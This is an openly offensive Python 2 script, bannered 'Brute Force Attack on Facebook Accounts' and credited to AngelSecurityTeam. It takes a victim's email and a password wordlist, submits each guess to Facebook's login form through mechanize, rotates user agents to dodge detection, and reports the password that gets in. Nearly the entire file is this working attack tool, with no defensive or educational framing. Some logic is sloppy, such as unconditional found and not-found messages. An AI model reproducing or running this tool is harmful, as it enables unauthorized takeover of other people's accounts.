#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os,sys,mechanize,cookielib,random,time

print """
                                
\033[0;34m██████╗ ██╗     ██╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗    ███████╗██████╗ 
██╔══██╗██║     ██║   ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗
██████╔╝██║     ██║   ██║█████╗  ██║   ██║██████╔╝██║     █████╗      █████╗  ██████╔╝
\033[0;1m██╔══██╗██║     ██║   ██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ██╔══╝  ██╔══██╗
██████╔╝███████╗╚██████╔╝██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ██║     ██████╔╝
╚═════╝ ╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚═╝     ╚═════╝ V2.0                                                                             
               \033[0;34m        Brute Force Attack on Facebook Accounts \033[0;1m | AngelSecurityTeam\033[0;1m |                                                                                                                                                              
"""  
email = raw_input("Email : ")
dic = raw_input("\nWordlist : ")
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0',"Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0","    Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:62.0) Gecko/20100101 Firefox/62.0","    Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.13; ko; rv:1.9.1b2) Gecko/20081201 Firefox/60.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.1","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/58.0","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20060814 Firefox/51.0","")]

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        inicio()
        inicio2()
        print("\nPossible Password Found : \033[34m {}".format(password))
        print("\n\033[0;1mPassword Not Found")
        time.sleep(1)
        

                        
def buscar(password):
	    
        
        print("\ntesting password - {}".format(password))
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\nPassword Found :\033[34m {}".format(password)) 
                        sys.exit(1)
                        
def inicio2():
        global password
        password2 = open(dic,"r")
        for password in password2:
                password2 = password.replace("\n","")
                buscar(password)
def inicio():

        dic2 = open(dic,"r")
        dic2 = dic2.readlines()
if __name__ == '__main__':
 main()
